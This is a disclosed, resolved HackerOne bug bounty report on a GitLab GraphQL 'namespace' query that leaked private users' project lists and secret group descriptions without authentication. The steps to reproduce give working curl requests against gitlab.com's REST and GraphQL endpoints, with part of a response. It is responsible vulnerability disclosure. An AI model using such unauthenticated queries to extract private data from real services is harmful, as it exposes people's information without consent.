# [M] GraphQL query "namespace" leaks data

## Summary
Severity: Medium (CVSS 5.3)
Program: GitLab
Weakness: Improper Access Control - Generic
Reporter: rpadovani
State: resolved
Disclosed: 2019-12-03T09:50:15.303Z
Source: https://hackerone.com/reports/614355

## Details
> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

### Summary

Using the "namespace" query on Graphql you can retrieve some private data that is not available through Standard API or through Web API

### Steps to reproduce
#### User namespace

1. My Gitlab profile is private: https://gitlab.com/rpadovani
2. You cannot access a list of my projects: https://gitlab.com/users/rpadovani/contributed
3. You cannot access these data through the standard APIs:
```
curl --header "PRIVATE-TOKEN: anotherUserToken" 'https://gitlab.com/api/v4/namespaces/16048'
{"message":"404 Namespace Not Found"}
```
(rpadovani user id is 16048, I used access token of another user for this curl request)
4. You can however access all these data, without any token (so no need to be registered), through Graphql:

```
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}' 
```
Response (omitted other 19 projects for brevity):

```
{"data":{"namespace":{"description":"","requestAccessEnabled":true,"fullName":"rpadovani","fullPath":"rpadovani","id":"gid://gitlab/Namespace/18021","lfsEnabled":true,"name":"rpadovani","path":"rpadovani","visibility":"public","projects":{"edges":[{"node":{"id":"gid://gitlab/Project/11265641","name":"737-max-8","archived":false,"visibility":"public","description":"https://737max8.com"}}, ...OMIT...     
```
 
#### Group namespace

A Graphql query on a secret group / subgroup can bring to disclose the description of the group
1. No access from GUI: https://gitlab.com/secret-group-213
2. Access through GraphQL (please notice I do not provide any access token, at all):

```
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```


_Trimmed to 38 lines — full report: https://hackerone.com/reports/614355_
